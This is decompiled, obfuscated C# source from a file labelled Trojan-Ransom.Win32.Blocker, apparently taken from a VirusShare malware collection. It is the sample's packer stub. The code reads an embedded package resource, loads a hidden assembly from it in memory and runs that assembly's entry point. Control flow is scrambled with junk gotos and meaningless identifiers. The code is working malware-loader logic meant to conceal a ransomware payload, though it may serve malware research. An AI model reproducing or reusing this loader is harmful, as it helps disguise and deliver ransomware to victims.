// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Server - Copie.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b2ee9c3ad9ebe06b
// MVID: 464A3559-2CEF-42C3-ACF6-93589CCAE5E5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bfak-4224025a62a9463b50ddaac1b803ecb34049f47c330432c4c632a71e0d710ae6.exe

using \u0004;
using \u0006;
using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;

namespace \u0004
{
  internal static class \u0001
  {
    private static Assembly \u0001(Package p, string u)
    {
      Uri uri = new Uri(u, UriKind.Relative);
      Assembly assembly;
      if (true)
      {
        Stream stream1 = \u0002.\u007E\u0002((object) \u0001.\u007E\u0001((object) p, uri));
        if (true)
          goto label_13;
label_2:
        byte[] numArray;
        Stream stream2;
        try
        {
          int length = (int) \u0003.\u007E\u0003((object) stream2);
          do
          {
            if (true)
            {
              numArray = new byte[length];
              length = global::\u0004.\u007E\u0004((object) stream2, numArray, 0, numArray.Length);
            }
          }
          while (false);
        }
        finally
        {
          if (stream2 != null)
            \u0005.\u007E\u0005((object) stream2);
        }
        assembly = global::\u0006.\u0007(numArray);
        if ((object) assembly != null)
          goto label_11;
        else
          goto label_10;
label_13:
        stream2 = stream1;
        goto label_2;
      }
      else
        goto label_11;
label_10:
      throw new ArgumentException(\u0007.\u0008(\u0002.\u0001(220), u));
label_11:
      if (true)
        return assembly;
      goto label_10;
    }

    [STAThread]
    private static void \u0001(string[] args)
    {
      try
      {
        // ISSUE: type reference
        Stream stream = \u000F.\u007E\u0010((object) \u000E.\u007E\u000F((object) \u0008.\u000E(__typeref (\u0001))), \u0002.\u0001(257));
        try
        {
          Package p = \u0010.\u0011(stream, FileMode.Open, FileAccess.Read);
          try
          {
            Assembly assembly = \u0001.\u0001(p, \u0002.\u0001(266));
            object obj = \u0012.\u007E\u0013((object) \u0011.\u007E\u0012((object) assembly), (object) null, new object[1]
            {
              (object) args
            });
          }
          finally
          {
            if (p != null)
              \u0005.\u007E\u0005((object) p);
          }
        }
        finally
        {
          if (stream != null)
            \u0005.\u007E\u0005((object) stream);
        }
      }
      catch (Exception ex)
      {
        string[] strArray;
        if (true)
          strArray = new string[5]
          {
            \u0014.\u007E\u0015((object) \u0013.\u007E\u0014((object) ex)),
            \u0002.\u0001(303),
            \u0014.\u007E\u0016((object) ex),
            \u0002.\u0001(303),
            \u0014.\u007E\u0017((object) ex)
          };
        int num = (int) \u0016.\u0019(\u0015.\u0018(strArray));
      }
    }
  }
}
